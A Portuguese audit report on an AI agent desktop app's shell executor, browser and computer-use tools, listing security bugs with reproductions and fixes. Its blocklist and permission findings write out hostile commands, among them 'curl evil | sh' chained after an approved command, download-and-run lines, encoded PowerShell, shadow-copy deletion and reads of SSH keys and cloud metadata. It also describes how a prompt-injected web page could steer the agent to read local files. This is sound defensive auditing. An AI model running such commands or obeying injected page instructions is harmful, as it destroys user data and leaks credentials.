| M06-082 | Logs: últimas linhas, linhas próximas ao erro, regex, resumo, info estruturada de testes (§12) | ❌ | — |
| M06-083 | Logs: deixar claro quando o trecho foi truncado (§12) | 🟡 | `truncateMiddle` tem marcador; o corte de 600 000 chars do foreground é silencioso (shell.ts:227-228) |
| M06-084 | Config: shell padrão, executáveis, limites de saída, máx. de processos, política de encerramento (§13) | ❌ | Constantes no código; só `shellTimeoutSec` e `environments` são configuráveis |
| M06-085 | Config: WSL com distro; detectar shells disponíveis; não assumir WSL (§13) | 🟡 | `distro` no perfil ✅; `availableShells()` ✅ só para o PTY |
| M06-086 | Config: executável ausente → informar e permitir alternativa (§13) | 🟡 | PTY cai no primeiro shell disponível (term.ts:86); agente sem alternativa |
| M06-087 | Segurança: validar parâmetros, cwd, limites (§14) | ✅ | Zod + `WorkspaceGuard` + timeouts |
| M06-088 | Segurança: política de execução aplicada no executor real (§14) | 🟡 | `evaluateTool` + `checkCommand` ✅ no código; **padrão do produto é `unrestricted`** (BUG-02) |
| M06-089 | Segurança: lista de comandos perigosos (§14) | 🟡 | 16 regras (policy.ts:93-110); verificado: 18 de 26 comandos arriscados testados passam (inclui equivalentes diretos de regras existentes: `powershell -enc`, `Remove-Item -Recurse -Force C:`, `rmdir /s /q`) e 5 de 7 comandos benignos são bloqueados (BUG-09) |
| M06-090 | Segurança: bloquear credenciais em comandos (§14.2) | ✅ | `sensitive.ts` (`run_command/start_process`), `tests/core-gaps.test.ts:295-380` — só quando o modo não é `unrestricted` |
| M06-091 | Segurança: "permitir sempre" sem alargar a permissão (§14) | ❌ | Regra com `*` vira curinga; prefixo `x:*` casa `x && malicioso` (BUG-10) |
| M06-092 | Segurança: não eleva privilégios sozinho (§14.1) | ✅ | Nenhum código eleva |
| M06-093 | Segredos fora de logs e mensagens (§14.2) | ❌ | Saída do processo sem `redactSecrets` (`runner.ts:851-868`); `sanitizedEnv` só filtra nomes `API_KEY/TOKEN/SECRET/PASSWORD/PASSWD/CREDENTIAL/PRIVATE_KEY` |
| M06-094 | Não executar scripts de instalação só por estarem no repositório (§14.3) | 🟡 | Só instrução de prompt; `startDevServer` (preview.ts) só roda por ação do usuário |
| M06-095 | Proteção contra encerramento de processos alheios (§14) | ✅ | M06-060 |
| M06-096 | Testes unitários: validação, construção de args, estados, timeouts, cancelamento, buffers, streaming, limites (§15.1) | ❌ | Só `tests/environments.test.ts` (função pura) e `tests/harness.test.ts:611` |
| M06-097 | Execução pontual: comando simples, stdout, exit code, falha (§15.2) | ✅ | E2E `scripts/ui-work.cjs` (soma e `exit 3`) |
| M06-098 | Execução pontual: comando inexistente, processo lento, cancelamento, liberação de recursos (§15.2) | ❌ | Nenhum teste no repositório (eu executei: ENOENT, abort 0,9 s) |
| M06-099 | Terminal interativo: criar, digitar, ler, vários comandos, encerrar (§15.3) | ✅ | `scripts/ui-panes.cjs:88-106` (E2E de UI; não reexecutado) |
| M06-100 | Terminal interativo: resize, interrupção, recuperação após falhas (§15.3) | ❌ | — |
| M06-101 | Processos persistentes: id, estado, logs, encerramento (§15.4) | ✅ | `tests/harness.test.ts:611-637`; E2E |
| M06-102 | Processos persistentes: ausência de órfãos (§15.4, §16) | ❌ | Nenhum teste; órfãos reproduzíveis (BUG-05/06) |
| M06-103 | Integração com o Agent Core (diagnóstico → erro → novo comando → relatório) (§15.5) | 🟡 | `tests/runner.test.ts:186-198` (ferramenta falsa) e `ui-work.cjs` (provedor roteirizado, ferramentas reais) |
| M06-104 | Integração com a UI: saída em tempo real, estados, cancelamento (§15.6) | ✅ | `ui-work.cjs`, `tmp/ui-work/*.png` |

### 4.1 Critérios de aceitação do Módulo 06 (§16)

| # | Critério | Resultado |
|---|---|---|
| A06-01 | Comandos pontuais | Atendido |
| A06-02 | stdout e stderr | Atendido (foreground) |
| A06-03 | Exit code correto | Atendido (cancelamento aparece como erro genérico; WSL 4294967295) |
| A06-04 | Sessões interativas | Só para o usuário |
| A06-05 | Enviar entrada a um processo | NÃO atendido |
| A06-06 | Processos longos | Atendido |
| A06-07 | Logs em tempo real | Atendido |
| A06-08 | Consultar estado dos processos | Parcial |
| A06-09 | Timeouts tratados | Parcial (filho desacoplado e teto de 10 min) |
| A06-10 | Cancelamento funciona | Parcial |
| A06-11 | Encerramento considera filhos | Parcial (sem Job Object) |
| A06-12 | Saída grande sem crescimento ilimitado | Atendido (mas perde a cauda) |
| A06-13 | PowerShell e CMD | CMD no agente; PowerShell/CMD/Git Bash no PTY |
| A06-14 | WSL e outros | Parcial (não executável nesta máquina) |
| A06-15 | UI apresenta o terminal | Atendido |
| A06-16 | Agent Core usa o executor central | Atendido |
| A06-17 | Subagents coordenados | NÃO atendido |
| A06-18 | Skills/comandos usam o terminal | NÃO atendido |
| A06-19 | Controle de execução no ponto correto | Parcial (default `unrestricted`) |
| A06-20 | Testes executados | Parcial (poucos; sem timeouts/cancel/órfãos) |
| A06-21 | Funcionalidades anteriores intactas | Atendido |
| A06-22 | Sem processos órfãos após os testes | NÃO atendido (reproduzível) |

---

# 5. Bugs e riscos encontrados

Gravidade: **Crítico** (execução errada/fuga de segurança em uso normal) · **Alto** (falha frequente ou risco concreto) · **Médio** · **Baixo**.
"Evidência" diz como o achado foi confirmado: **[exec]** executei o código do projeto; **[leitura]** conclusão por leitura de código (não executada, normalmente porque exigiria controlar o desktop).
Receitas de reprodução dos experimentos estão no Apêndice A.

## BUG-01 · Crítico · Extensão do Chrome: as ações não fazem o que reportam

- **Onde:** `resources/chrome-extension/background.js` — clique :245-264 (função injetada :248-260); digitação :265-288 (`submit` :284); `press` :289-294; snapshot :227-241; `open/navigate` :212-226; `wait_for` :193-201 e :306-308; `screenshot` :295-305; `execute` :169-173 (só o frame principal).
- **O que acontece:**
  1. `nodes.find(n => (aria-label || textContent).includes(name))` percorre `*` em ordem de documento; `<html>.textContent` contém a página inteira, então o primeiro "match" é o `<html>`. O campo `role` é ignorado. Resultado: clicar no botão "Salvar" dispara `click()` em `<html>` e a ferramenta devolve "clique realizado".
  2. `submit` e `browser_press` usam `KeyboardEvent` sintético (`isTrusted=false`): o navegador não executa a ação padrão (enviar formulário, mudar foco).
  3. `element.value = …` ignora o setter nativo que React/Vue observam; formulários controlados não atualizam o estado.
  4. O "snapshot" é `document.body.innerText`: sem papéis, nomes acessíveis, estados nem refs, ao contrário do que a descrição das ferramentas e o `ARCHITECTURE.md` §10 prometem.
  5. `open/navigate/new_tab` retornam quando a navegação é *iniciada* (`tabs.update/create`), sem esperar `complete`; o snapshot seguinte pode ler a página anterior.
  6. `wait_for` usa `querySelector` (existência, não visibilidade); `screenshot` usa `captureVisibleTab(windowId)` (aba visível da janela, não necessariamente a aba da sessão).
- **Reproduzir [exec]:** Apêndice A.6 (`e6.cjs`) extrai o código **do próprio `background.js`** e o executa em Chromium headless numa página local: saída real — `click {role:button,name:"Salvar"}` → elementos clicados `['HTML#']`; `#log` continua "nada"; `type submit=true` → campo = "abc", formulário **não** enviado; `press Enter` sintético → nada.
- **Efeito:** com a extensão conectada (modo `auto` é o padrão, `settings.ts:93`), o agente "navega" sem que nada aconteça e acredita que deu certo. Hoje ninguém percebeu porque a extensão nunca foi carregada (`docs/PENDENCIAS-2026-10-25.md`: `attached:false`).

## BUG-02 · Crítico · Padrão `unrestricted` e migração silenciosa de privilégios

- **Onde:** `src/main/settings.ts:18-28` (`DEFAULT_POLICY.mode='unrestricted'`, `fullAccess/allowNetwork/allowComputerControl=true`), `:177-184` (`migrate` converte `ask`/`auto` em `unrestricted` e força as três flags), `permissions.ts:111-113` (retorna `allow` antes de qualquer verificação), `policy.ts:118` (`checkCommand` não bloqueia nada), `runner.ts:820-822` (hooks `PreToolUse/UserPromptSubmit` ignorados), `orchestrator.ts:371-386`.
- **Efeito:** por padrão nenhuma aprovação é pedida, a lista de comandos perigosos e a guarda de credenciais (`sensitive.ts`) deixam de valer (o `checkSensitiveAccess` vem *depois* do retorno antecipado), e o `WorkspaceGuard` fica irrestrito. O comentário em `settings.ts:20-22` ("Dangerous commands and secret files still ask") é falso, e `ARCHITECTURE.md` §5/§12 ("Operações irreversíveis sempre pedem confirmação, inclusive em auto") descreve outro produto.
- **Reproduzir [exec]:** `evaluateTool(browser_open, 'file:///C:/Users/<u>/.ssh/id_rsa', {mode:'unrestricted'})` → `allow`; com `mode:'ask'` → `deny` (Apêndice A.2).
- **Nota:** é uma escolha explícita do dono ("ultrarrestrito"), mas sem consentimento in-app, sem limites duros mínimos e com migração que sobe privilégio de quem tinha `ask`.

## BUG-03 · Crítico · Navegador sem política de URL; guarda de credenciais com buraco

- **Onde:** `tools/browser.ts:19-21, 48, 277-279` (`z.string().url()` aceita `file:`, `javascript:`, `data:`, `chrome:`, `view-source:`); `sensitive.ts:420-423` (cobre `browser_open`/`browser_navigate`, **não** `browser_new_tab`); `permissions.ts:151-152` (rede não listada em `ALWAYS_CONFIRM` = `allow` em `ask`) e `:274-276` (`browser_new_tab/claim_tab/close_tab` presentes em todos os modos, inclusive `ask/plan/review`); `rules.ts:43-44` (regras `domain:` só valem para open/navigate); `tools/web.ts:12-24` (SSRF só protege `fetch_url`).
- **Reproduzir [exec]:** Apêndice A.2 em modo `ask`: `browser_open file:///…/.ssh/id_rsa` → deny; `browser_new_tab` com a mesma URL → **allow**; `browser_navigate http://169.254.169.254/…` e `http://localhost:8080/admin` → allow; `browser_claim_tab {active:true}` e `browser_close_tab` → allow, sem confirmação. Apêndice A.5: `browser_new_tab file:///C:/Windows/win.ini` abriu e `browser_read` devolveu `; for 16-bit app support [fonts] …`.
- **Efeito:** uma página com injeção de prompt pode mandar o agente ler arquivos locais (não existe guarda de workspace no navegador), alcançar serviços internos/metadados, adotar a aba pessoal do usuário e fechá-la.

## BUG-04 · Crítico · Ambientes SSH/Nuvem executam parte do comando localmente

- **Onde:** `src/core/tools/shell.ts:56-60` (monta `ssh host 'cd … && cmd'` com aspas POSIX e `shell:true`, ou seja, `cmd.exe` no Windows). `tests/environments.test.ts:27-52` só confere substrings.
- **Reproduzir [exec]:** `environmentSpawn('echo PARTE1 && echo PARTE2_EXECUTADA_LOCALMENTE', …, {kind:'ssh', command:'echo [PREFIXO-REMOTO]', remoteCwd:'/srv/app'})` gera `echo [PREFIXO-REMOTO] 'cd '\''/srv/app'\'' && echo PARTE1 && echo PARTE2_EXECUTADA_LOCALMENTE'`; a saída real foi três linhas: o "remoto" truncado, `PARTE1` e `PARTE2_EXECUTADA_LOCALMENTE'` — as duas últimas rodaram no `cmd.exe` local.
- **Efeito:** `npm run deploy && …` num perfil SSH roda o segundo trecho na máquina errada. Também: `list_ports` (`shell.ts:464`) roda `netstat -ano` no ambiente selecionado (inútil em WSL/SSH).

## BUG-05 · Alto · Subagents: desktop compartilhado e processos órfãos

- **Onde:** `agents/runtime.ts:348-351` (`services = {...caller.services, browser: novo}` → o mesmo `ComputerLayer`), `:424-426` (o `finally` só fecha o navegador); `orchestrator.ts:620-639, 825, 1013` (`onChildEnd` esvazia `agentChildren`, então `killAgentChildren` só alcança filhos ainda ativos); `shell.ts:27-29, 167-180` (mapas por `sessionId`).
- **Efeito (desktop) [leitura]:** duas ferramentas `computer_*` de agentes diferentes executam ao mesmo tempo sobre um único mouse/teclado reais; `layerFor` ainda chama `configure()` do singleton a cada chamada e `backend()` reinicia o processo `mcp` se `allowControl` divergir (layer.ts:228-249), derrubando a chamada de outro agente.
- **Efeito (processos):** um `start_process` feito por subagent sobrevive ao fim do subagent, mas (a) o pai não o enxerga (`read_process_output/list_processes` consultam `background.get(ctx.sessionId)`), (b) a UI filtra por dono (`index.ts:1910`) e não o lista, (c) `abort/dispose` não o encerram e (d) não há Job Object (grep vazio): sobrevive até ao fechamento do Electron.

## BUG-06 · Alto · Timeout e cancelamento não alcançam filhos desacoplados; teto global não mata

- **Onde:** `shell.ts:235-257` (o `Promise` só resolve em `close`; `taskkill /T` parte do PID do `cmd`, que já saiu); `runner.ts:55, 1882-1886, 1991` (`withTimeout` só rejeita a promise; o processo continua); `index.ts:301` (`shellTimeoutSec` até 3 600 s) e `shell.ts:269` (`timeout_ms` até 900 000) excedem `TOOL_TIMEOUT_MS = 600 000`.
- **Reproduzir [exec]:** `runShellCommand('start /b ping -n 8 127.0.0.1 > nul', …, timeout=1000)` → retornou após **7,2 s** (`timedOut:true`). O mesmo vale para `start /b npm run dev`: bloqueia até o servidor morrer.
- **Efeito:** o turno trava além do timeout e o filho segue vivo; com 10 min do runner a ferramenta é declarada "excedeu 600 s" sem matar nada.

## BUG-07 · Alto · stdin nunca é fechado nem escrito

- **Onde:** `shell.ts:71` (`spawn` com `stdio` padrão: `stdin` é um pipe aberto e ocioso); não existe `send_input`.
- **Reproduzir [exec]:** `node -e "process.stdin.on('end',()=>console.log('EOF'));process.stdin.resume()"` com timeout 3 s → 3,3 s, `timedOut:true`, sem saída.
- **Efeito:** qualquer programa que lê stdin (REPL, `python`, `sort`, `git commit` sem `-m`, `npm init`) trava até o timeout, e o agente não tem como responder a um prompt (M06 §6.2).

## BUG-08 · Alto · Saída: perde o fim e chega ilegível

- **Onde:** `shell.ts:224-230` (`if (stdout.length < MAX_BUFFER) stdout += text`: guarda o início e descarta o resto, sem aviso); `:97, :225` (`toString('utf8')` por pedaço, sem `StringDecoder`).
- **Reproduzir [exec]:** (a) 12 000 linhas de 100 chars seguidas de `FIM_DO_BUILD_FALHOU` → `stdoutLen=600114`, a última linha **ausente**; (b) `echo ação útil & chcp` sob `spawn(shell:true)` → bytes `61 87 c6 6f` (CP850), decodificados como `a��o`; "comando inexistente" devolve `n�o � reconhecido…`; (c) `wsl.exe` devolveu a mensagem em **UTF-16LE** (`O\u0000 \u0000W\u0000S\u0000L…`) em `stdout`, com `exit=4294967295`.
- **Efeito:** a causa de uma falha de build/teste costuma estar no fim da saída e é justamente a parte perdida; mensagens de erro em português chegam como lixo ao modelo.

## BUG-09 · Alto · Lista de comandos perigosos com furos e falsos positivos

- **Onde:** `policy.ts:93-110, 117-133`. É a única barreira em modo `auto`/`accept-edits` e nenhuma em `unrestricted`.
- **Reproduzir [exec]:** Apêndice A.1. Passam (não bloqueados): `Remove-Item -Recurse -Force C:\`, `Remove-Item -Recurse -Force $HOME`, `rmdir /s /q C:\Users\Public`, `del /f /s /q C:\Windows\*`, `powershell -enc …`, `powershell -e …`, `Invoke-Expression (iwr …)`, `curl … -o a.sh && bash a.sh`, `Stop-Process`, `taskkill /F /IM explorer.exe`, `git push --force`, `git reset --hard`, `git clean -fdx`, `vssadmin delete shadows`, `schtasks /create`, `reg add …\Run`, `Set-ExecutionPolicy`, `cipher /w:C:` (18 de 26). Bloqueados indevidamente: `git commit -m "fix reboot bug"`, `echo shutdown`, `npm run reboot-server`, `grep "format c:"`, `rm -rf *.tmp` (5 de 7 benignos).
- **Efeito:** a barreira é regex sobre texto livre, contornável por sinônimos e sem normalização; ao mesmo tempo atrapalha uso legítimo.

## BUG-10 · Alto · "Permitir sempre" alarga a permissão

- **Onde:** `rules.ts:103-113` (`matchCommand`: padrão com `*` vira `^….*$`; padrão `x:*` casa qualquer sufixo) e `:193-197` (`ruleForApproval` grava o comando aprovado literalmente, inclusive com `*`).
- **Reproduzir [exec]:** aprovar `rm -rf build/*.tmp` com "permitir sempre" grava `Bash(rm -rf build/*.tmp)`; a regra passa a casar `rm -rf build/../src/keep.tmp` e `rm -rf build/x ; rm -rf ~/docs/*.tmp`. Com `Bash(npm test:*)`, casam `npm test && curl evil | sh` e `npm test & calc` (só `;` escapa).
- **Efeito:** uma aprovação pontual vira licença para encadear comandos arbitrários. Falta tratar operadores de shell (`&&`, `||`, `&`, `|`, `;`, redirecionamento, `$()`).

## BUG-11 · Alto · `read_process_output filter` consome o que não casa

- **Onde:** `shell.ts:394-398`: `takeNewOutput` avança `readOffset` antes do filtro.
- **Reproduzir [exec]:** processo imprime `LINHA_A erro`, `LINHA_B ok`, `LINHA_C erro`; `read_process_output {filter:'LINHA_B'}` devolve só `LINHA_B ok`; a leitura seguinte sem filtro responde "(sem saída nova)". As linhas A e C só existem no buffer da UI.
- **Efeito:** o agente perde linhas de erro ao procurar outra coisa.

## BUG-12 · Alto · Ponte do Chrome: comandos obsoletos e diagnóstico vazio

- **Onde:** `bridge.ts:216-229` (no timeout só remove de `pending`; o comando continua em `commands`), `:314-320` (`consoleEntries/errors` retornam `[]`), `:122-132` (`taskkill /IM openclod-chrome-host.exe /F` mata hosts de qualquer instância), `:197-214` (polling de 150 ms); `main.go:127-178` (o `poll` desiste após 20 falhas, mas o host continua vivo e aceitando mensagens). Sem roteamento por perfil do Chrome.
- **Reproduzir [exec]:** com `hello` simulado e comando `click` com timeout de 600 ms, a ferramenta recebeu "o Chrome não respondeu…"; `bridge.commands.length` continuou 1 e, ao a extensão voltar a consultar, o `click` foi **entregue** (Apêndice A.7).
- **Efeito:** um clique que o agente já considera falho pode ser executado depois, em outro momento da navegação; no modo Chrome `browser_console` informa "sem erros de rede" sempre.

## BUG-13 · Alto · Playwright/`BrowserLayer`: lacunas e armadilhas

As seis primeiras linhas foram confirmadas por **[exec]** (Apêndice A.5, página local em 127.0.0.1, Chrome headless); as demais são **[leitura]**/grep:

| Sintoma verificado | Onde |
|---|---|
| 2 botões "Excluir": `browser_click` clicou o primeiro e retornou ok | `layer.ts:372, 389-390` (`.first()`) |
| iframe: snapshot mostra só `- iframe`; clicar no botão interno estoura 15 s | `layer.ts:347-362`, `locate` :452-462 |
| `target=_blank`: abas antes/depois `[1,1]` — popup não rastreado | `layer.ts:231-243` (sem `context.on('page')`) |
| `alert()` descartado sem informar o modelo | sem handler `dialog` |
| `fill` em `<select>`/checkbox falha | `layer.ts:377-396`; faltam `select_option/check` |
| 600 respostas 500 → `networkErrors.length = 600` e a URL traz `?token=SEGREDO599` | `layer.ts:92, 211-219` (sem teto, sem redação) |
| Sem download/upload, `go_back/forward/reload`, `wait_for_url/load_state`, `hover`, `scroll` | `grep` vazio em `src/` |
| `browser_open` com `headed` diferente do atual chama `close()` e perde abas/cookies; como o padrão de `headed` é `false` a cada chamada, omitir a flag depois de ter usado `true` destrói a sessão | `layer.ts:180` |
| Contexto efêmero, sem perfil persistente/`storageState`/proxy/headless configurável | `layer.ts:182-206` |
| Sem `browser.on('disconnected')`: crash do Chromium deixa estado obsoleto | `layer.ts` (grep vazio) |
| Modo `auto` assume o Chrome pessoal assim que a extensão conecta | `layer.ts:113-116`, `settings.ts:93` |

## BUG-14 · Alto · Segredos em logs e na saída

- **Onde [leitura]:** `activity-store.ts:35` (`JSON.stringify(event.args)` na Atividade); `session/store.ts:214-219` + `orchestrator.ts:1136-1139` (todo evento, com `tool_start.args`, vai para `<sessão>.events.jsonl`, sem teto de tamanho); `tools/browser.ts:128` e `tools/computer.ts:684` (`describe()` inclui o texto digitado no cartão de aprovação); `runner.ts:851-868` (`toolResultPart` não aplica `redactSecrets` à saída de nenhuma ferramenta); `policy.ts:186-196` (`sanitizedEnv` só remove nomes que casam `API_KEY|TOKEN|SECRET|PASSWORD|PASSWD|CREDENTIAL|PRIVATE_KEY`; `AWS_ACCESS_KEY_ID`, `DATABASE_URL`, `*_PAT`, `NPM_CONFIG__AUTH` passam); `terminal.ts:62-72` (PTY herda quase todo o ambiente do Electron — por desenho, mas sem aviso).
- **Efeito:** senha digitada por `browser_type`/`computer_type_text` permanece em claro em disco; `type .env` fora do modo `unrestricted` é barrado só pelo nome do arquivo, e qualquer outro arquivo com segredo chega ao modelo sem mascaramento.

## BUG-15 · Médio · Captura de tela

- `layer.ts:777-835`: (a) captura por PowerShell **DPI-unaware** (`GetAwarenessFromDpiAwarenessContext = 0`, medido), com `VirtualScreen`/`CopyFromScreen` e `windowAtPoint` (`computer.ts:17-60`) em coordenadas virtualizadas, enquanto o overlay converte com `screen.screenToDipPoint` (físico→DIP) — a 100% de escala (esta máquina, `LogPixels=96`) tudo coincide; **>100% não foi verificado e nada o trata**; (b) o `spawn` do PowerShell não tem timeout (`:801-811`); (c) os PNGs em `%TEMP%\openclod-shots` nunca são apagados (45 arquivos, 13 MB medidos); (d) `captureScreen` grava `this.lastCapture` (`:826`) e o botão de screenshot da UI chama `captureScreen(1400)` (`orchestrator.ts:1697`): depois de o usuário capturar a tela pela UI, o agente passa a converter coordenadas da captura de 1600 px com a escala de 1400 px; (e) o desktop virtual de 3840 px é reduzido a 1600 (fator 0,417) e não há captura por monitor/região para recuperar legibilidade; (f) o hit-test compila C# a cada chamada: **1,6-1,9 s** medidos (`e11.cjs`), o que torna `expect_window` caro.

## BUG-16 · Médio · Cache de snapshots sem evicção

- `layer.ts:184-186, 417-420`: `snapshotRefs` e `snapshotFrames` crescem a cada snapshot (um `Set` e um `Map` por árvore) e nunca são limpos; só `windowScreenshots` é removido. Sessões longas com `observe_after` acumulam memória.

## BUG-17 · Médio · Defeitos pequenos em `computer_*`

- `interactive_only` não filtra nada: a regex `^\s*(text|paragraph|…)` espera o papel no início, mas as linhas começam pelo índice (`\t4 text …`); verificado com linhas reais da matriz (4 de 4 mantidas) — `computer.ts:319-323`. `depth` conta o `\t` inicial como nível 1 (`:309-318`).
- `computer_type_text` com `element_index` sem `app/window` ignora o índice e digita na janela em primeiro plano (`computer.ts:704-723`); o schema não exige o alvo.
- `computer_wait_for` sem `contains` usa como baseline um snapshot que pode ter falhado e depois declara "interface mudou" (`:1123-1129`); `computer_wait` não respeita `signal` (`:1096-1100`).
- `ComputerLayer.call/run` não recebem `AbortSignal` (`layer.ts:252-259, 637-663`): uma ação em curso (drag 45 s, type 60 s) não pode ser cancelada.

## BUG-18 · Médio · `computer_open_path`/`computer_launch` como canal de execução sem blocklist

- `computer.ts:895-962`: `rundll32 url.dll,FileProtocolHandler <caminho>` executa `.exe/.bat/.lnk/.hta/.msi`; o caminho é resolvido com `path.resolve(ctx.cwd, …)` (sem `WorkspaceGuard`) e a ferramenta é `exec` (em `auto`/`unrestricted` roda sem pergunta). Não passa por `checkCommand` nem por `sensitive.ts`. **[leitura]**

## BUG-19 · Médio · Encerramento de processos

- `shell.ts:182-192`: `killTree` é fire-and-forget (`spawn('taskkill').unref()`), não confirma; no ramo POSIX usa `process.kill(-pid)` mas o `spawn` não é `detached` (`:71`), então falharia em silêncio. `stop_process` devolve ok em 14 ms (medido) e o estado final é só `exit 1` (não existe "cancelado"). O registro usa o PID do SO como chave (`:105-107`): reutilização de PID sobrescreve registros. O PID que o agente vê é o do `cmd.exe`, não o do programa final.

## BUG-20 · Médio · Terminal integrado do usuário

- `terminal.ts:85`: terminais encerrados continuam contando para `MAX_TERMINALS = 12` até serem fechados; `:111` copia 200 KB de string a cada evento de saída; `:135-138` sem controle de fluxo; `TerminalPane.tsx`: sem tratamento de copiar/colar (Ctrl+C = SIGINT), sem busca; o agente não consegue usar esses terminais (M06-018).

## BUG-21 · Médio · Sem "botão de pânico" durante o controle real

- `computer-overlay.ts:162, 176-178` (janela transparente, `focusable:false`, `setIgnoreMouseEvents`); o único atalho global é `Control+Alt+F` (`index.ts:2317`), que só mostra a janela. Enquanto o agente move o mouse, o usuário só consegue parar chegando ao botão da janela principal, que pode estar coberta pela aplicação controlada.

## BUG-22 · Baixo · Documentação e UI desatualizadas

- `README.md:141-143` ("Navegador (10)", "Computer Use (14)") x 15 e 22 ferramentas reais; `README.md` §8 diz "backend opcional / `npm i -g`" mas o binário é embutido; `renderer/src/lib/format.ts:67-88` não tem rótulo para `browser_tabs/new_tab/claim_tab/switch_tab/close_tab` nem para `computer_list_apps/get_window/cursor_position/window_at/mouse_move/mouse_button/open_path/secondary_action/wait_for/wait_for_window`; `CODE_REUSE_MATRIX.md:150-154` lista como "planejado" o que o prompt exigia como implementado (itens 8, 11, 12).

## Observações (não são bugs)

- **O painel "Navegador" (`BrowserPane.tsx`, `<webview>` na partição `persist:openclod-preview`) não é o navegador do agente.** O agente usa Playwright ou o Chrome do usuário; ele não vê nem controla o preview do dev server. Vale deixar isso explícito na UI.
- **Pontos fortes confirmados:** referência de elemento obsoleta é recusada (`resolveSnapshotRef`, `tests/computer-tools.test.ts:166`); conversão de coordenadas valida limites (`tests/computer-mouse.test.ts:60`); `settle` por quietude (`tests/computer-settle.test.ts`); hit-test `expect_window/expect_title`; detector de chamada idêntica; `abort` encerra a árvore com `taskkill /T /F` em 0,9 s sem órfãos (medido); `stop_process` exige aprovação para PIDs que o agente não criou; `start_process` não trata silêncio como falha; saída longa vira arquivo com resumo; overlay protegido contra captura.
- **Versionamento:** boa parte do que sustenta este módulo ainda é **não versionada** no git (`?? `): `src/core/computer/settle.ts`, `src/core/tools/{lazy,images,limitations}.ts`, `src/core/agent/loop-detection.ts`, `tests/{computer-settle,ocr,loop-detection,lazy-tools}.test.ts`, os PNGs de `Prints/computer-use-2026-10-24/` e `scripts/ocr-live.ts`; `computer-use-matrix.json` e `computer-use-live.ts` estão modificados sem commit. Um `git clean` ou checkout apagaria as provas citadas aqui.
- Em `scratchpad/ui/SUMMARY.txt` (outra sessão) o `ui-work.cjs` aparece com `exit=1` (`page` indefinido ao conectar no Electron). Não tem relação com este código e não serve como prova a favor nem contra; não reexecutei.

---

# 6. Melhorias recomendadas (priorizadas)

Convenção: **P0** = corrigir antes de confiar no módulo/entregar; **P1** = necessário para cumprir o prompt; **P2** = acabamento e cobertura. Cada item traz o arquivo a alterar e o **critério de pronto** (verificável por teste ou evidência).

## P0 — corrigir antes de qualquer outra coisa

| # | Melhoria | Arquivo(s) | Critério de pronto |
|---|---|---|---|
| P0-1 | **Refazer as ações da extensão** (BUG-01): resolver alvo por papel+nome acessível (`role` + `aria-label`/`labelledby`/texto, `getBoundingClientRect` visível, único), recusar 0/N correspondências devolvendo candidatos; usar `chrome.debugger` (CDP `Input.dispatchKeyEvent/dispatchMouseEvent`) ou clique em coordenadas de eventos confiáveis para Enter/clique; setter nativo (`Object.getOwnPropertyDescriptor(proto,'value').set`) para inputs controlados; snapshot de acessibilidade (CDP `Accessibility.getFullAXTree` ou script que gere papel/nome/estado/ref); `navigate/open` aguardando `tabs.onUpdated status=complete`; `wait_for` com visibilidade; `captureVisibleTab` só após ativar a aba da sessão; `allFrames`/shadow | `resources/chrome-extension/background.js` (+ `manifest.json` se usar `debugger`) | Teste `tests/chrome-extension-actions.test.ts` que carrega o **mesmo** `background.js` em Chromium headless contra uma página local: clique por papel+nome acerta o botão certo (e recusa duplicatas), Enter envia o formulário, input React-like atualiza o estado, snapshot contém papéis, `open` só retorna após `complete`. Execução manual registrada com a extensão carregada (`attached:true`) |
| P0-2 | **Padrões seguros e consentimento explícito** (BUG-02): instalação nova começa em `ask`/`accept-edits`; `unrestricted` só por escolha confirmada na UI (com texto do que desliga); `migrate()` nunca eleva privilégio nem reativa `allowComputerControl/allowNetwork/fullAccess` desligados; manter limites duros mesmo em `unrestricted` (ao menos: credenciais, `format`/`diskpart`/`bcdedit`, remoção da raiz) ou torná-los uma chave separada; corrigir o comentário de `settings.ts:20-22` e `ARCHITECTURE.md` §5/§12 | `src/main/settings.ts`, `src/core/security/permissions.ts`, `docs/ARCHITECTURE.md`, `src/renderer/.../SettingsDialog.tsx` | `tests/settings-migration.test.ts`: (a) `defaultSettings().policy.mode !== 'unrestricted'`; (b) migrar `ask` continua `ask`; (c) flags desligadas permanecem desligadas. UI mostra banner permanente em `unrestricted` |
| P0-3 | **Política de URL central para navegador** (BUG-03): `assertBrowsableUrl(url, policy)` — só `http/https/about:blank`; bloquear `file:`, `javascript:`, `data:`, `chrome:`, `view-source:`; negar loopback/privado/link-local/metadados a menos que a regra permita (`localhost:3000` do dev server é caso legítimo → allowlist por regra); reaplicar no destino final com `context.route`/`page.on('response')`/`webRequest`; aplicar em `browser_open/navigate/new_tab/claim_tab` e no `chrome.tabs.update` da extensão; incluir `browser_new_tab` em `sensitive.ts`; `claim_tab`/`close_tab` entram em `ALWAYS_CONFIRM`; tirar `claim/close_tab` dos modos `ask/plan/review` | `src/core/security/url-policy.ts` (novo), `tools/browser.ts`, `core/browser/layer.ts`, `security/permissions.ts:7-27, 151, 274-276`, `security/sensitive.ts:420-423`, `security/rules.ts:43-44` | Testes: `file:///…/.ssh/id_rsa`, `http://169.254.169.254`, `http://10.0.0.5`, redirecionamento 302 para `file:`/metadados, e `browser_new_tab` com `file:` → negados nos modos `ask/auto`; `http://localhost:5173` permitido só com regra. Reexecutar `e2.cjs` (Apêndice A.2) sem nenhum `allow` indevido |
| P0-4 | **Corrigir ambientes SSH/Nuvem** (BUG-04): dividir `environment.command` em argv (`shell-quote`/parser próprio) e passar o comando remoto como **um único argumento** com `shell:false`; para `docker exec … bash -lc` idem; teste que executa o prefixo real com um binário falso | `src/core/tools/shell.ts:47-61`, `tests/environments.test.ts` | Teste de integração: prefixo `node fake-ssh.js`, comando `echo a && echo b` chega **inteiro** em `argv[2]`; nenhum trecho roda localmente |
| P0-5 | **Ciclo de vida de processos robusto** (BUG-05/06/07/19): (i) `stdio: ['ignore','pipe','pipe']` por padrão; (ii) resolver a promessa em `exit` + prazo curto para fechar os pipes (destruir streams) em vez de esperar `close`; (iii) matar descendentes por **Job Object** (módulo nativo/helper) ou varrer `Win32_Process` por `ParentProcessId` antes do `taskkill`; (iv) `AbortSignal` do runner repassado à ferramenta para `withTimeout` realmente cancelar; (v) `killTree` aguarda e confirma (`tasklist`/exit) e devolve `terminated:boolean`; (vi) `cancelled` como estado; (vii) tirar a chave por PID e usar id interno | `src/core/tools/shell.ts`, `src/core/agent/runner.ts:55, 1882-1886`, `src/main/index.ts:301` | Testes (sem Electron): `start /b ping -n 8` com timeout 1 s retorna em < 3 s e nenhum `ping` sobrevive; `abort` em `npm run dev` simulado deixa 0 filhos; leitura de stdin termina com EOF; timeout > teto do runner é recusado ou ajustado de forma coerente |
